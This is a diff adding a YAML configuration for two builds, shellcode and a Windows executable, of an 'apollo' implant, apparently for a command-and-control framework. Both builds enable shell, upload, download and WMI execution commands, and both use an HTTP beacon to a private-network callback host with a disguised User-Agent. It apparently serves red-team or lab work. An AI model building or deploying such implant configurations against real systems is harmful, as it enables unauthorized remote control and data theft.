@@ -1,0 +1,72 @@
+payloads:
+  - name: apollo.shellcode
+    payload: apollo
+    os: Windows
+    commands: 
+      - exit
+      - register_file
+      - download
+      - load
+      - ps
+      - run
+      - shell
+      - upload
+      - wmiexecute
+    c2_profiles:
+      - c2_profile: "http"
+        c2_profile_parameters:
+          callback_host: "http://192.168.56.1"
+          callback_interval: 10
+          callback_jitter: 23
+          callback_port: 80
+          AESPSK: aes256_hmac
+          get_uri: index
+          headers:
+            User-Agent: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+          killdate: 11/02/2026
+          query_path_name: q
+          encrypted_exchange_check: true
+          post_uri: data
+    parameters:
+      debug: False
+      adjust_filename: False
+      shellcode_bypass: "Continue on fail"
+      shellcode_format: Binary
+      output_type: Shellcode
+
+  - name: apollo.exe
+    payload: apollo
+    os: Windows
+    commands: 
+      - exit
+      - register_file
+      - download
+      - load
+      - ps
+      - run
+      - shell
+      - upload
+      - wmiexecute
+    c2_profiles:
+      - c2_profile: "http"
+        c2_profile_parameters:
+          callback_host: "http://192.168.56.1"
+          callback_interval: 10
+          callback_jitter: 23
+          callback_port: 80
+          AESPSK: aes256_hmac
+          get_uri: index
+          headers:
+            User-Agent: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+          killdate: 11/02/2026
+          query_path_name: q
+          encrypted_exchange_check: true
+          post_uri: data
+    parameters:
+      debug: False
+      adjust_filename: False
+      shellcode_bypass: "Continue on fail"
+      shellcode_format: Binary
+      output_type: WinExe
+
+
